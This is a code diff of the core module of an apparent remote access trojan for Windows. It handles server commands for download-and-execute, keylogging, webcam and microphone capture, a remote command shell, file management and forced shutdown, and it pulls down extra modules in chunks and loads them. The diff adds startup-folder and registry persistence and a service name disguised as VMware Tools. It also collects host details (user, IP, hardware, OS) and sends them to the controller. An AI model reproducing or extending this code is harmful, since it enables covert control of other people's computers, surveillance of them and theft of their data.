@@ -1,19 +1,29 @@
 #define STRSAFE_NO_DEPRECATE
 
 #include "Kernel.h"
-#include "IOCPClient.h"
 #include <time.h>
 #include <dshow.h>
 #include <WinInet.h>
 #include <STDIO.H>
 #include <process.h>
 #include "ModuleMgr.h"
-
+#include "utils.h"
+#include   <shlobj.h>
+#pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "Strmiids.lib") 
-CKernel::CKernel() :
-CEventHandler(KNEL)
+
+#define SERVICE_NAME TEXT("Vmware Tools Core Service")
+
+CKernel::CKernel(CManager*pManager) :
+CMsgHandler(pManager, KNEL)
+
 {
 	m_pModuleMgr = new CModuleMgr(this);
+
+	m_module_size = 0;
+	m_loaded_size = 0;
+	m_checksum = 0;
+	m_module_buffer = nullptr;
 }
 
 
@@ -26,26 +36,26 @@ CKernel::~CKernel()
 }
 
 /***********************************************************************/
-void CKernel::OnConnect()
+void CKernel::OnOpen()
 {
-	//printf("Kernel::OnConnect()!\n");
+
 }
+
 void CKernel::OnClose()
 {
 	// close waiting mgr.
-	if (WAIT_TIMEOUT == WaitForSingleObject(m_pModuleMgr->m_hModuleTrans, 0)){
-		//
-		SetEvent(m_pModuleMgr->m_hFree);
+	if (WAIT_TIMEOUT == WaitForSingleObject(m_pModuleMgr->m_hFree, 0)){
+		//如果现在还有正在传输的模块....
 		SetEvent(m_pModuleMgr->m_hModuleTrans);
-		//
-		m_pModuleMgr->m_pCurModule = NULL;
+		m_pModuleMgr->m_current_module_name = "";
 	}
+	SetEvent(m_pModuleMgr->m_hFree);
 	//
 }
 
-void CKernel::OnReadComplete(WORD Event, DWORD dwTotal, DWORD dwRead, char*Buffer)
+void CKernel::OnReadMsg(WORD Msg, DWORD dwSize, char*Buffer)
 {
-	switch(Event)
+	switch (Msg)
 	{
 	case KNEL_READY:
 		OnReady();				//Send Login infomation;
@@ -57,14 +67,8 @@ void CKernel::OnReadComplete(WORD Event, DWORD dwTotal, DWORD dwRead, char*Buffe
 		OnPower_Shutdown();
 		break;
 	case KNEL_EDITCOMMENT:
-		OnEditComment((WCHAR*)Buffer);
+		OnEditComment((TCHAR*)Buffer);
 		break;
-	//case KNEL_UPLOAD_MODULE_FROMDISK:
-	//	OnUploadModuleFromDisk(dwRead,Buffer);
-	//	break;
-	//case KNEL_UPLOAD_MODULE_FORMURL:
-	//	OnUploadModuleFromUrl(dwRead,Buffer);
-	//	break;
 	case KNEL_CMD:
 		OnCmd();
 		break;
@@ -87,7 +91,7 @@ void CKernel::OnReadComplete(WORD Event, DWORD dwTotal, DWORD dwRead, char*Buffe
 		OnMicrophone();
 		break;
 	case KNEL_DOWNANDEXEC:
-		OnDownloadAndExec((WCHAR*)Buffer);
+		OnDownloadAndExec((TCHAR*)Buffer);
 		break;
 	case KNEL_EXIT:
 		OnExit();
@@ -95,18 +99,118 @@ void CKernel::OnReadComplete(WORD Event, DWORD dwTotal, DWORD dwRead, char*Buffe
 	case KNEL_KEYBD_LOG:
 		OnKeyboard();
 		break;
-	case KNEL_MODULE:
-		OnModule(Buffer, dwRead);
+
+	//模块传输......
+	case KNEL_MODULE_INFO:
+		OnModuleInfo(Buffer);
+		break;
+	case KNEL_MODULE_CHUNK_DAT:
+		OnRecvModuleChunk(Buffer);
+		break;
+	//
+	case KNEL_UTILS_COPYTOSTARTUP:
+		OnUnilsCopyToStartupMenu();
+		break;
+	case KNEL_UTILS_WRITE_REG:
+		OnUtilsWriteStartupReg();
 		break;
 	}
 }
 
+
+void CKernel::GetModule(const char* ModuleName){
+	//释放资源....
+	m_current_module = ModuleName;
+	m_loaded_size = 0;
+	m_module_size = 0;
+	m_checksum = 0;
+
+	if (m_module_buffer){
+		delete[] m_module_buffer;
+		m_module_buffer = nullptr;
+	}
+	//
+	SendMsg(KNEL_GETMODULE_INFO, (char*)ModuleName, lstrlenA(ModuleName) + 1);
+}
+
+void CKernel::OnRecvModuleChunk(char* Chunk){
+	DWORD *chunkInfo = (DWORD*)Chunk;
+
+	DWORD moduleSize = chunkInfo[0];
+	DWORD chunkSize = chunkInfo[1];
+	DWORD checksum = chunkInfo[2];
+		
+	unsigned char * chunkData = (unsigned char*)Chunk + sizeof(DWORD) * 3;
+	
+	for (size_t i = 0; i < chunkSize; i++){
+		checksum -= chunkData[i];
+	}
+
+	if (moduleSize != m_module_size || checksum){
+		//invalid module.....
+		m_pModuleMgr->LoadModule(nullptr, 0);
+		return;
+	}
+
+	//Save Module Chunk Data.....
+	memcpy(m_module_buffer + m_loaded_size, chunkData, chunkSize);
+	m_loaded_size += chunkSize;
+	//continue get module chunk...
+	GetModuleChunk();
+}
+
+void CKernel::OnModuleInfo(char* info){
+	DWORD  size = ((DWORD*)info)[0];
+	DWORD  checksum = ((DWORD*)info)[1];
+	char * name = info + sizeof(DWORD) * 2;
+	
+	if (m_current_module != name){
+		m_pModuleMgr->LoadModule(nullptr, 0);
+		return;
+	}
+
+	m_module_size = size;
+	m_checksum = checksum;
+	m_module_buffer = new char[m_module_size];
+	//
+	GetModuleChunk();
+}
+
+#define MAX_CHUNK_SIZE 0x2000
+
+void CKernel::GetModuleChunk(){
+	//
+	if (m_module_size == m_loaded_size){
+		m_pModuleMgr->LoadModule(m_module_buffer, m_module_size);
+		return;
+	}
+
+	// Get Chunk Data:
+
+	// Total Size,checksum, offset,chunk size,
+	size_t size = sizeof(DWORD) * 4 + lstrlenA(m_current_module.c_str()) + 1;
+	char * lpBuffer = (char*)calloc(1, size);
+	DWORD* Packet = (DWORD*)lpBuffer;
+	char * name = lpBuffer + sizeof(DWORD) * 4;
+
+	DWORD LeftSize = m_module_size - m_loaded_size;
+	Packet[0] = m_module_size;
+	Packet[1] = m_checksum;
+	Packet[2] = m_loaded_size;
+	Packet[3] = LeftSize < MAX_CHUNK_SIZE ? LeftSize : MAX_CHUNK_SIZE;
+	
+	lstrcpyA(name, m_current_module.c_str());
+
+	//获取下一个数据块..
+	SendMsg(KNEL_MODULE_CHUNK_GET, lpBuffer, size);
+	free(lpBuffer);
+}
 /*******************************************************************************
 			Get Ping
-********************************************************************************/
+			********************************************************************************/
 /*
 	TTL: time to live,最长生存时间,每经过一个节点,TTL-1,到0的时候丢弃.;
-*/
+	*/
 /*
 ping 请求:type 8,code 0;
 ping 相应:type 0,code 0;
@@ -135,42 +239,41 @@ UINT16 CKernel::icmp_checksum(char*buff, int len)
 	if (len & 1)
 		checksum += buff[len - 1];
 	len--;
-	for (int i = 0; i < len; i += 2)
-	{
+	for (int i = 0; i < len; i += 2){
 		checksum += *(UINT16*)&buff[i];	//取两个字节相加.;
 	}
-	while ((Hi = (checksum >> 16)))
-	{
+	while ((Hi = (checksum >> 16))){
 		checksum = Hi + checksum & 0xFFFF;
 	}
 	return ~(USHORT)(checksum & 0xFFFF);
 }
 DWORD CKernel::GetPing(const char*host)
 {
-	struct MyIcmp
-	{
-		UINT8 m_type;			
+	struct MyIcmp{
+		UINT8 m_type;
 		UINT8 m_code;
-		UINT16 m_checksum;		//校验和算法;
-		UINT16 m_id;			//唯一标识;
-		UINT16 m_seq;			//序列号;
-		DWORD  m_TickCount;		//
+		UINT16 m_checksum;			//校验和算法;
+		UINT16 m_id;				//唯一标识;
+		UINT16 m_seq;				//序列号;
+		LARGE_INTEGER  m_TickCount;		//
 	};
 
 	DWORD interval = -1;
 	USHORT id = LOWORD(GetProcessId(NULL));
-	DWORD TickCountSum = 0;
+	double TickCountSum = 0;
 	DWORD SuccessCount = 0;
+	LARGE_INTEGER frequency;
+
 	//
 	MyIcmp icmp_data = { 0 };
 	char RecvBuf[128] = { 0 };
 	sockaddr_in dest = { 0 };
 	int i = 0;
 	HOSTENT *p = NULL;
+	QueryPerformanceFrequency(&frequency);
 
 	SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
-	if (s == INVALID_SOCKET)
-	{
+	if (s == INVALID_SOCKET){
 		return interval;
 	}
 	//set recv time out;
@@ -178,48 +281,50 @@ DWORD CKernel::GetPing(const char*host)
 	setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
 
 	//获取目标主机IP;
-	
+
 	p = gethostbyname(host);
 	if (!p)
 		goto Return;
+
 	memcpy(&dest.sin_addr, p->h_addr_list[0], 4);
 	dest.sin_family = AF_INET;
-	
+
 	//设置icmp头;
 	icmp_data.m_type = 8;
 	icmp_data.m_code = 0;
 	icmp_data.m_id = id;//唯一标识;
 
-	for(i = 1;i<=4;i++)
-	{
+	for (i = 1; i <= 4; i++){
 		icmp_data.m_seq = i;	//序列;
 		icmp_data.m_checksum = 0;
 
-		icmp_data.m_TickCount = GetTickCount();
+		QueryPerformanceCounter(&icmp_data.m_TickCount);
 		icmp_data.m_checksum = icmp_checksum((char*)&icmp_data, sizeof(icmp_data));
 		//
-		if (INVALID_SOCKET == sendto(s, (char*)&icmp_data, sizeof(icmp_data), 0, (sockaddr*)&dest, sizeof(dest)))
-		{
+		if (INVALID_SOCKET == sendto(s, (char*)&icmp_data, sizeof(icmp_data),
+			0, (sockaddr*)&dest, sizeof(dest))){
 			goto Return;
 		}
 		int namelen = sizeof(dest);
 		int nRecv = recvfrom(s, RecvBuf, 128, 0, (sockaddr*)&dest, &namelen);
-		if (INVALID_SOCKET == nRecv && WSAETIMEDOUT != WSAGetLastError())
-		{
+		if (INVALID_SOCKET == nRecv && WSAETIMEDOUT != WSAGetLastError()){
 			goto Return;
 		}
 		//接受到了.IP头的第一个字节,低四位是HeaderLen,高四位是版本.;
-		if ((RecvBuf[0] & 0xf0) == 0x40)//ipv4
-		{
+		if ((RecvBuf[0] & 0xf0) == 0x40){
 			//ipv4:
-			DWORD IPHeaderLenght = (RecvBuf[0] & 0x0f) * 4;
-			char*RecvIcmpData = RecvBuf + IPHeaderLenght;
-			if (((MyIcmp*)RecvIcmpData)->m_id == id&&((MyIcmp*)RecvIcmpData)->m_seq == i)
-			{
+			DWORD IPHeaderLength = (RecvBuf[0] & 0x0f) * 4;
+			char*RecvIcmpData = RecvBuf + IPHeaderLength;
+			if (((MyIcmp*)RecvIcmpData)->m_id == id && ((MyIcmp*)RecvIcmpData)->m_seq == i){
 				//计算间隔.GetTickCount精度有点低,将就一下。;
-				TickCountSum += GetTickCount() - ((MyIcmp*)RecvIcmpData)->m_TickCount;
+				LARGE_INTEGER cur_counter;
+
+				QueryPerformanceCounter(&cur_counter);
+
+				TickCountSum += ((double)cur_counter.QuadPart -
+					((MyIcmp*)RecvIcmpData)->m_TickCount.QuadPart) / frequency.QuadPart * 1000;	//计算ms.
 				SuccessCount++;
-				interval = TickCountSum/SuccessCount + 1;
+				interval = TickCountSum / SuccessCount + 1;
 			}
 		}
 	}
@@ -230,114 +335,78 @@ Return:
 
 /*******************************************************************************
 				GetPrivateIP
-********************************************************************************/
-void CKernel::GetPrivateIP(WCHAR PrivateIP[128])
+				********************************************************************************/
+void CKernel::GetPrivateIP(TCHAR PrivateIP[128])
 {
 	PrivateIP[0] = L'-';
 	PrivateIP[1] = 0;
 
-	char IP[128] = {0};
-	USHORT uPort = 0;
-	GetSockName(IP,uPort);
-	for(int i = 0;;i++)
-	{
-		PrivateIP[i] = IP[i];
-		if(!PrivateIP[i])
+	auto const  peer = GetSockName();
+	for (int i = 0;; i++){
+		PrivateIP[i] = peer.first[i];
+		if (!PrivateIP[i])
 			break;
 	}
 }
 
 /*******************************************************************************
 				GetCPU
-********************************************************************************/
-void CKernel::GetPCName(WCHAR PCName[128])
+				********************************************************************************/
+void CKernel::GetPCName(TCHAR PCName[128])
 {
 	DWORD BufferSize = 128;
-	GetComputerNameW(PCName, &BufferSize);	
+	GetComputerNameW(PCName, &BufferSize);
 }
-void CKernel::GetCurrentUser(WCHAR User[128])
+void CKernel::GetCurrentUser(TCHAR User[128])
 {
 	DWORD BufferSize = 128;
-	GetUserNameW(User,&BufferSize);
+	GetUserNameW(User, &BufferSize);
 }
 
-static WCHAR* MemUnits[] =
+void CKernel::GetRAM(TCHAR RAMSize[128])
 {
-	L"Byte",
-	L"KB",
-	L"MB",
-	L"GB",
-	L"TB"
-};
-void CKernel::GetRAM(WCHAR RAMSize[128])
-{
-	
 	MEMORYSTATUSEX MemoryStatu = { sizeof(MEMORYSTATUSEX) };
-	ULONGLONG ullRAMSize = 0;
-	if (GlobalMemoryStatusEx(&MemoryStatu))
-	{
-		ullRAMSize = MemoryStatu.ullTotalPhys;
+	LARGE_INTEGER liRAMSize = { 0 };
+	if (GlobalMemoryStatusEx(&MemoryStatu)){
+		liRAMSize.QuadPart = MemoryStatu.ullTotalPhys;
 	}
-	int MemUnitIdx = 0;
-	int MaxIdx = (sizeof(MemUnits) / sizeof(MemUnits[0])) - 1;
-	while (ullRAMSize > 1024 && MemUnitIdx < MaxIdx)
-	{
-		MemUnitIdx++;
-		ullRAMSize >>= 10;
-	}
-	DWORD dwRAMSize = (DWORD)(ullRAMSize&0xffffffff);
-	++dwRAMSize;
-	wsprintfW(RAMSize, L"%u %s", dwRAMSize, MemUnits[MemUnitIdx]);
+	GetStorageSizeString(liRAMSize, RAMSize);
 }
 
-void CKernel::GetDisk(WCHAR szDiskSize[128])
+void CKernel::GetDisk(TCHAR szDiskSize[128])
 {
-	ULONGLONG ullDiskSize = 0;
+	LARGE_INTEGER liDiskSize = { 0 };
 	DWORD Drivers = GetLogicalDrives();
-	WCHAR Name[] = L"A:\\";
-	while (Drivers)
-	{
-		if (Drivers & 0x1)
-		{
+	TCHAR Name[] = TEXT("A:\\");
+	while (Drivers){
+		if (Drivers & 0x1){
 			DWORD Type = GetDriveTypeW(Name);
-			if (DRIVE_FIXED == Type)
-			{
+			if (DRIVE_FIXED == Type){
 				ULARGE_INTEGER TotalAvailableBytes;
 				ULARGE_INTEGER TotalBytes;
 				ULARGE_INTEGER TotalFreeBytes;
 				GetDiskFreeSpaceExW(Name, &TotalAvailableBytes, &TotalBytes, &TotalFreeBytes);
-				ullDiskSize += TotalBytes.QuadPart;
+				liDiskSize.QuadPart += TotalBytes.QuadPart;
 			}
 		}
 		Name[0]++;
 		Drivers >>= 1;
 	}
-	int MemUnitIdx = 0;
-	int MaxIdx = (sizeof(MemUnits) / sizeof(MemUnits[0])) - 1;
-	while (ullDiskSize > 1024 && MemUnitIdx < MaxIdx)
-	{
-		MemUnitIdx++;
-		ullDiskSize >>= 10;
-	}
-	DWORD dwDiskSize = (DWORD)(ullDiskSize&0xFFFFFFFF);
-	++dwDiskSize;
-	wsprintfW(szDiskSize, L"%u %s", dwDiskSize, MemUnits[MemUnitIdx]);
+	GetStorageSizeString(liDiskSize, szDiskSize);
 }
 
-void CKernel::GetOSName(WCHAR OsName[128])
+void CKernel::GetOSName(TCHAR OsName[128])
 {
 	HKEY hKey = 0;
 	DWORD dwType = REG_SZ;
 	DWORD dwSize = 255;
-	WCHAR data[MAX_PATH] = { 0 };
+	TCHAR data[MAX_PATH] = { 0 };
 	OsName[0] = 0;
 
 	if (!RegOpenKeyW(HKEY_LOCAL_MACHINE,
-		L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", &hKey))
-	{
-		if (!RegQueryValueExW(hKey, L"ProductName", NULL, &dwType,(LPBYTE)data, &dwSize))
-		{
-			lstrcpyW(OsName,data);
+		TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), &hKey)){
+		if (!RegQueryValueExW(hKey, TEXT("ProductName"), NULL, &dwType, (LPBYTE)data, &dwSize)){
+			lstrcpyW(OsName, data);
 		}
 		RegCloseKey(hKey);
 	}
@@ -345,64 +414,82 @@ void CKernel::GetOSName(WCHAR OsName[128])
 	SYSTEM_INFO si = { sizeof(si) };
 	//GetSystemInfo获取子系统版本.
 
-	typedef VOID  (__stdcall *PGetNativeSystemInfo)(
+	typedef VOID(__stdcall *PGetNativeSystemInfo)(
 		LPSYSTEM_INFO lpSystemInfo
-	);
-	HMODULE hKernel32 = GetModuleHandleW(L"Kernel32");
-	if(hKernel32)
-	{
-		PGetNativeSystemInfo GetNativeSystemInfo = (PGetNativeSystemInfo)GetProcAddress(hKernel32,"GetNativeSystemInfo");
-		if(GetNativeSystemInfo != NULL)
-		{
+		);
+
+	HMODULE hKernel32 = GetModuleHandleW(TEXT("Kernel32"));
+	if (hKernel32){
+		PGetNativeSystemInfo GetNativeSystemInfo =
+			(PGetNativeSystemInfo)GetProcAddress(hKernel32, "GetNativeSystemInfo");
+		if (GetNativeSystemInfo){
 			//printf("GetNativeSystemInfo: %x\n",GetNativeSystemInfo);
 			GetNativeSystemInfo(&si);
 			if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
-				si.wProcessorArchitecture == PROCESSOR_AMD_X8664||
-				si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
-				{
-					bit = 64;
-				}
+				si.wProcessorArchitecture == PROCESSOR_AMD_X8664 ||
+				si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64){
+				bit = 64;
+			}
 			//printf("GetNativeSystemInfo OK !\n");
-			WCHAR Bit[8] = { 0 };
-			wsprintfW(Bit, L" %d Bit", bit);
-			lstrcatW(OsName, Bit);
+			TCHAR Bit[16] = { 0 };
+			wsprintf(Bit, TEXT(" %d Bit"), bit);
+			lstrcat(OsName, Bit);
 		}
 	}
 }
 
 
-void CKernel::GetCPU(WCHAR CPU[128])
+void CKernel::GetCPU(TCHAR CPU[128])
 {
 	//0x80000002-->0x80000004
 	char szName[64] = { 0 };
 	__asm
 	{
-		xor esi,esi
+		xor esi, esi
 		mov edi, 0x80000002
-	getinfo:
+		getinfo:
 		mov eax, edi
-		add eax,esi
+		add eax, esi
 		cpuid
-		shl esi,4
+		shl esi, 4
 		mov dword ptr[szName + esi + 0], eax
 		mov dword ptr[szName + esi + 4], ebx
 		mov dword ptr[szName + esi + 8], ecx
 		mov dword ptr[szName + esi + 12], edx
-		shr esi,4
+		shr esi, 4
 		inc esi
-		cmp esi,3
+		cmp esi, 3
 		jb getinfo
 
 		mov ecx, 0
-		mov edi,[CPU]
+		mov edi, [CPU]
 	copyinfo:
-		mov al,byte ptr[szName + ecx]
-		mov byte ptr[edi + ecx*2], al
+		mov al, byte ptr[szName + ecx]
+		mov byte ptr[edi + ecx * 2], al
 		inc ecx
-		test al,al
+		test al, al
 		jne copyinfo
 	}
+
+	SYSTEM_INFO si = { 0 };
+	HKEY hKey = NULL;
+	DWORD dwMHZ = 0;
+	DWORD Type = REG_DWORD;
+	DWORD cbBuffer = sizeof(dwMHZ);
+	TCHAR subKey[] = TEXT("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
 	
+	
+	if (ERROR_SUCCESS != RegCreateKeyW(HKEY_LOCAL_MACHINE,
+		subKey, &hKey)){
+		return;
+	}
+
+	if (ERROR_SUCCESS == RegQueryValueExW(hKey, TEXT("~MHz"),
+		0, &Type, (LPBYTE)&dwMHZ, &cbBuffer)){
+		GetSystemInfo(&si);
+		_t_sprintf(CPU, TEXT("%d MHz * %d"), dwMHZ, si.dwNumberOfProcessors);
+	}
+	RegCloseKey(hKey);
 }
 
 DWORD CKernel::HasCamera()
@@ -448,76 +535,80 @@ DWORD CKernel::HasCamera()
 			var.vt = VT_BSTR;                                //保存的是二进制数据;
 			hr = pBag->Read(L"FriendlyName", &var, NULL);
 			//获取FriendlyName形式的信息;
-			if (hr == NOERROR)
-			{
+			if (hr == NOERROR){
 				nCam++;
 				SysFreeString(var.bstrVal);   //释放资源，特别要注意;
 			}
 			pBag->Release();                  //释放属性页接口指针;
 		}
-		pM->Release();                        //释放监控器接口指针;
+		pM->Release();                        
 	}
 	CoUninitialize();                   //卸载COM库;
 	return nCam;
 }
 
-void CKernel::GetInstallDate(WCHAR InstallDate[128])
+void CKernel::GetInstallDate(TCHAR InstallDate[128])
 {
 	HKEY hKey = NULL;
 	//Open Key
-	if(ERROR_SUCCESS !=RegCreateKeyW(HKEY_LOCAL_MACHINE,L"SOFTWARE\\HHClient",&hKey)){	
-		lstrcpyW(InstallDate,L"-");
+	if (ERROR_SUCCESS != RegCreateKeyW(HKEY_CURRENT_USER,
+		TEXT("SOFTWARE\\HHClient"), &hKey)){
+		lstrcpyW(InstallDate, L"-");
 		return;
-	}	
-	DWORD cbBuffer = 128*sizeof(WCHAR);
+	}
+	DWORD cbBuffer = 128 * sizeof(TCHAR);
 	DWORD Type = 0;
-	if(ERROR_SUCCESS!=RegQueryValueExW(hKey,L"InstallDate",0,&Type,(LPBYTE)InstallDate,&cbBuffer))
-	{
+
+	if (ERROR_SUCCESS != RegQueryValueExW(hKey,
+		TEXT("InstallDate"), 0, &Type, (LPBYTE)InstallDate, &cbBuffer)){
 		//Set key value;
-		WCHAR CurDate[64] = {'U','n','k','n','o','w','n','\0'};
+		//失败.....
+		TCHAR CurDate[64] = { 'U', 'n', 'k', 'n', 'o', 'w', 'n', '\0' };
 		time_t CurTime = time(NULL);
 		tm*pLocalTime = localtime(&CurTime);
 
-		if(pLocalTime)
-		{
-			wsprintfW(CurDate,L"%d-%d-%d %d:%d:%d",pLocalTime->tm_year+1900,pLocalTime->tm_mon+1,
-				pLocalTime->tm_mday,pLocalTime->tm_hour,pLocalTime->tm_min,
+		if (pLocalTime){
+			wsprintf(CurDate, TEXT("%d-%d-%d %d:%d:%d"),
+				pLocalTime->tm_year + 1900, pLocalTime->tm_mon + 1,
+				pLocalTime->tm_mday, pLocalTime->tm_hour, pLocalTime->tm_min,
 				pLocalTime->tm_sec);
 		}
-		if(ERROR_SUCCESS!=RegSetValueExW(hKey,L"InstallDate",0,REG_SZ,(BYTE*)CurDate,sizeof(WCHAR)*(lstrlenW(CurDate)+1)))
-		{
-			lstrcpyW(InstallDate,L"-");
+		//
+		if (ERROR_SUCCESS != RegSetValueExW(hKey, TEXT("InstallDate"), 0,
+			REG_SZ, (BYTE*)CurDate, sizeof(TCHAR)*(lstrlenW(CurDate) + 1))){
+			//设置失败....返回...
+			lstrcpy(InstallDate, TEXT("-"));
 			RegCloseKey(hKey);
 			return;
 		}
-		lstrcpyW(InstallDate,CurDate);
+		//设置成功，返回设置的InstallDate....
+		lstrcpy(InstallDate, CurDate);
 	}
 	RegCloseKey(hKey);
 	return;
 }
 
-void CKernel::GetComment(WCHAR Comment[256])
+void CKernel::GetComment(TCHAR Comment[256])
 {
-	lstrcpyW(Comment,L"default");
+	lstrcpy(Comment, TEXT("default"));
 	HKEY hKey = NULL;
 	//Open Key
-	if(ERROR_SUCCESS ==RegCreateKeyW(HKEY_LOCAL_MACHINE,L"SOFTWARE\\HHClient",&hKey))
-	{	
-		DWORD cbBuffer = 256 * sizeof(WCHAR);
+	if (ERROR_SUCCESS == RegCreateKeyW(HKEY_CURRENT_USER, TEXT("SOFTWARE\\HHClient"), &hKey))
+	{
+		DWORD cbBuffer = 256 * sizeof(TCHAR);
 		DWORD Type = 0;
-		if(ERROR_SUCCESS==RegQueryValueExW(hKey,L"Comment",0,&Type,(LPBYTE)Comment,&cbBuffer))
-		{
-			//Get Comment Success;
-			return;
+		if (ERROR_SUCCESS == RegQueryValueExW(hKey, TEXT("Comment"), 
+			0, &Type, (LPBYTE)Comment, &cbBuffer)){
+			//do nothing.....
 		}
 		RegCloseKey(hKey);
-	}	
+	}
 	return;
 }
 
 void CKernel::GetLoginInfo(LoginInfo*pLoginInfo)
 {
-	memset(pLoginInfo,0,sizeof(LoginInfo));
+	memset(pLoginInfo, 0, sizeof(LoginInfo));
 	GetPrivateIP(pLoginInfo->PrivateIP);
 	GetPCName(pLoginInfo->HostName);
 	GetCurrentUser(pLoginInfo->User);
@@ -525,14 +616,12 @@ void CKernel::GetLoginInfo(LoginInfo*pLoginInfo)
 	GetInstallDate(pLoginInfo->InstallDate);
 	GetCPU(pLoginInfo->CPU);
 	GetDisk(pLoginInfo->Disk_RAM);
-	lstrcatW(pLoginInfo->Disk_RAM,L"/");
-	GetRAM(pLoginInfo->Disk_RAM + lstrlenW(pLoginInfo->Disk_RAM));
+	lstrcatW(pLoginInfo->Disk_RAM, TEXT("/"));
+	GetRAM(pLoginInfo->Disk_RAM + lstrlen(pLoginInfo->Disk_RAM));
 	//
-	char host[64];
-	USHORT Port;
-	GetPeerName(host,Port);
-	pLoginInfo->dwPing = GetPing(host);
-	//
+
+	auto const  peer = GetPeerName();
+	pLoginInfo->dwPing = GetPing(peer.first.c_str());
 	pLoginInfo->dwHasCamera = HasCamera();
 	GetComment(pLoginInfo->Comment);
 }
@@ -546,13 +635,13 @@ void CKernel::OnPower_Reboot()
 		return;
 
 	//获取关机特权的LUID
-	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME,    &tkp.Privileges[0].Luid);
+	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
 	tkp.PrivilegeCount = 1;
 	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
 	//获取这个进程的关机特权
 	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
-	if (GetLastError() != ERROR_SUCCESS) 
+	if (GetLastError() != ERROR_SUCCESS)
 		return;
 
 	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
@@ -566,13 +655,13 @@ void CKernel::OnPower_Shutdown()
 		return;
 
 	//获取关机特权的LUID
-	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME,    &tkp.Privileges[0].Luid);
+	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
 	tkp.PrivilegeCount = 1;
 	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
 	//获取这个进程的关机特权
 	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
-	if (GetLastError() != ERROR_SUCCESS) 
+	if (GetLastError() != ERROR_SUCCESS)
 		return;
 
 	ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, 0);
@@ -582,23 +671,30 @@ void CKernel::OnReady()
 {
 	LoginInfo li;
 	GetLoginInfo(&li);
-	//printf("Send Login info!\n");
-	Send(KNEL_LOGIN,(char*)&li,sizeof(li));
+	SendMsg(KNEL_LOGIN, (char*)&li, sizeof(li));
 }
 
-void CKernel::OnEditComment(WCHAR NewComment[256])
+void CKernel::OnEditComment(TCHAR NewComment[256])
 {
 	HKEY hKey = NULL;
+	TCHAR error[0x100];
 	//Open Key
-	if(ERROR_SUCCESS ==RegCreateKeyW(HKEY_LOCAL_MACHINE,L"SOFTWARE\\HHClient",&hKey))
-	{	
-		if(ERROR_SUCCESS==RegSetValueExW(hKey,L"Comment",0,REG_SZ,(BYTE*)NewComment,sizeof(WCHAR)*(lstrlenW(NewComment)+1)))
-		{
-			Send(KNEL_EDITCOMMENT_OK,(char*)NewComment,sizeof(WCHAR)*(lstrlenW(NewComment)+1));
-			RegCloseKey(hKey);
-			return;
+	if (ERROR_SUCCESS ==
+		RegCreateKey(HKEY_CURRENT_USER, TEXT("SOFTWARE\\HHClient"), &hKey)){
+		DWORD dwError = RegSetValueEx(hKey, TEXT("Comment"), 0,
+			REG_SZ, (BYTE*)NewComment, sizeof(TCHAR)*(lstrlen(NewComment) + 1));
+
+		if (ERROR_SUCCESS == dwError){
+			SendMsg(KNEL_EDITCOMMENT_OK, (char*)NewComment,
+				sizeof(TCHAR)*(lstrlen(NewComment) + 1));
 		}
-	}	
+		else{
+			_t_sprintf(error, TEXT("RegSetValueEx failed with error: %d"), dwError);
+			SendMsg(KNEL_ERROR, error, sizeof(TCHAR) * (lstrlen(error) + 1));
+		}
+		RegCloseKey(hKey);
+		return;
+	}
 	return;
 }
 
@@ -606,9 +702,9 @@ void CKernel::OnRestart()
 {
 	PROCESS_INFORMATION pi;
 	STARTUPINFOW si = { sizeof(si) };
-	wchar_t szModuleName[0x1000];
+	TCHAR szModuleName[0x1000];
 	//exec another instance.
-	GetModuleFileNameW(GetModuleHandleW(0), szModuleName, 0x1000);
+	GetModuleFileName(GetModuleHandle(0), szModuleName, 0x1000);
 	//
 	if (CreateProcess(szModuleName, 0, 0, 0, 0, 0, 0, 0, &si, &pi)){
 
@@ -619,146 +715,92 @@ void CKernel::OnRestart()
 }
 
 
-
 void CKernel::OnCmd()
 {
-	char szServerAddr[32] = { 0 };
-	USHORT uPort = 0;
-	GetSrvName(szServerAddr, uPort);
+	auto const  peer = GetPeerName();
 
-	if (!m_pModuleMgr->RunModule("cmd", szServerAddr, uPort, NULL)){
-		Send(KNEL_MODULE_BUSY, 0, 0);
+	if (!m_pModuleMgr->RunModule("cmd", peer.first.c_str(), peer.second, NULL)){
+		TCHAR szError[] = TEXT("Kernel is busy...");
+		SendMsg(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
 	}
 }
 
 void CKernel::OnChat()
 {
-	char szServerAddr[32] = { 0 };
-	USHORT uPort = 0;
-	GetSrvName(szServerAddr, uPort);
+	auto const  peer = GetPeerName();
 
-	if (!m_pModuleMgr->RunModule("chat", szServerAddr, uPort, NULL)){
-		Send(KNEL_MODULE_BUSY, 0, 0);
+	if (!m_pModuleMgr->RunModule("chat", peer.first.c_str(), peer.second, NULL)){
+		TCHAR szError[] = TEXT("Kernel is busy...");
+		SendMsg(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
 	}
 }
 
 void CKernel::OnFileMgr()
 {
-	char szServerAddr[32] = { 0 };
-	USHORT uPort = 0;
-	GetSrvName(szServerAddr, uPort);
+	auto const  peer = GetPeerName();
 
-	if (!m_pModuleMgr->RunModule("filemgr", szServerAddr, uPort, NULL)){
-		Send(KNEL_MODULE_BUSY, 0, 0);
